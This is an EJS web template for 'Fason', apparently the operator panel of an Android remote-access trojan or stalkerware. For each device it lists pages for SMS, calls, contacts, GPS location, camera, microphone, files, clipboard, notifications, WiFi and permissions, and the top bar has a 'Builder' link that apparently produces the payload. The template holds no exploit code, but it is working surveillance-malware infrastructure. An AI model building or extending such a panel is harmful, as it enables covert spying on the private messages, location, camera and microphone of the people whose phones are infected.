<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fason - <%= id %></title>
    <link rel="stylesheet" href="/css/style.css">
    <% if (page === 'gps') { %>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
    <% } %>
</head>
<body>
    <nav class="navbar">
        <a href="/" class="brand"><span class="fs-icon-sm">FS</span> Fason</a>
        <div class="nav-links">
            <a href="/">Dashboard</a>
            <a href="/builder">Builder</a>
            <a href="/logs">Logs</a>
            <a href="/logout">Logout</a>
        </div>
    </nav>

    <main class="container device-page">
        <aside class="sidebar">
            <div class="device-id"><%= id %></div>
            <nav class="menu">
                <a href="/device/<%= id %>/info" class="<%= page === 'info' ? 'active' : '' %>">📱 Info</a>
                <a href="/device/<%= id %>/sms" class="<%= page === 'sms' ? 'active' : '' %>">💬 SMS</a>
                <a href="/device/<%= id %>/calls" class="<%= page === 'calls' ? 'active' : '' %>">📞 Calls</a>
                <a href="/device/<%= id %>/contacts" class="<%= page === 'contacts' ? 'active' : '' %>">👥 Contacts</a>
                <a href="/device/<%= id %>/gps" class="<%= page === 'gps' ? 'active' : '' %>">📍 Location</a>
                <a href="/device/<%= id %>/camera" class="<%= page === 'camera' ? 'active' : '' %>">📷 Camera</a>
                <a href="/device/<%= id %>/mic" class="<%= page === 'mic' ? 'active' : '' %>">🎤 Mic</a>
                <a href="/device/<%= id %>/files" class="<%= page === 'files' ? 'active' : '' %>">📁 Files</a>
                <a href="/device/<%= id %>/apps" class="<%= page === 'apps' ? 'active' : '' %>">📦 Apps</a>
                <a href="/device/<%= id %>/clipboard" class="<%= page === 'clipboard' ? 'active' : '' %>">📋 Clipboard</a>
                <a href="/device/<%= id %>/notifications" class="<%= page === 'notifications' ? 'active' : '' %>">🔔 Notifications</a>
                <a href="/device/<%= id %>/wifi" class="<%= page === 'wifi' ? 'active' : '' %>">📶 WiFi</a>
                <a href="/device/<%= id %>/permissions" class="<%= page === 'permissions' ? 'active' : '' %>">🔐 Permissions</a>
                <a href="/device/<%= id %>/downloads" class="<%= page === 'downloads' ? 'active' : '' %>">💾 Downloads</a>
            </nav>
        </aside>

        <section class="content">
            <% if (page === 'notfound') { %>
                <div class="card"><h2>Device not found</h2><p class="empty">This device doesn't exist in the database.</p></div>
            <% } else { %>
                <%- include('pages/' + page, { data, id }) %>
            <% } %>
        </section>
    </main>

    <div id="toast" class="toast"></div>

    <script>const DEVICE_ID = '<%= id %>';</script>
    <% if (page === 'gps') { %>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <% } %>
    <script src="/js/app.js"></script>
</body>
</html>
